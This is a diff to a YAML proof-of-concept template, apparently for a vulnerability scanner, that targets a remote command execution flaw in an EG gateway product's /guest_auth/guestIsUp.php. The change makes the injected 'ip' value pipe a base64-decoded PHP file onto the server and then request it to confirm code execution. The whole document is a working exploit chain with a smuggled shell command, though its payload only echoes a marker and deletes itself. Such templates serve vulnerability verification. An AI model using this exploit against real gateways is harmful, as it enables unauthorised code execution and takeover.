@@ -1,8 +1,10 @@
-name: poc-yaml-eg-getway-rce
+name: poc-yaml-eggetway-rce
 set:
   r1: randomLowercase(4)
   r2: randomLowercase(4)
-  payload: base64(r1)
+  phpcode: >
+    "<?php echo '" + r1 + "'; unlink(__FILE__); ?>"
+  payload: base64(phpcode)
 rules:
   - method: POST
     path: "/guest_auth/guestIsUp.php"
@@ -11,11 +13,11 @@ rules:
       Accept-Encoding: "gzip, deflate"
       Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
     body: |
-      ip=127.0.0.1|echo "{{payload}}"|base64 -d > {{r2}}.txt&mac=00-00
+      ip=127.0.0.1|echo '{{payload}}' | base64 -d > {{r2}}.php&mac=00-00
     expression: |
       response.status == 200
   - method: GET
-    path: "/guest_auth/{{r2}}.txt"
+    path: "/guest_auth/{{r2}}.php"
     headers:
       User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
       Accept-Encoding: "gzip, deflate"
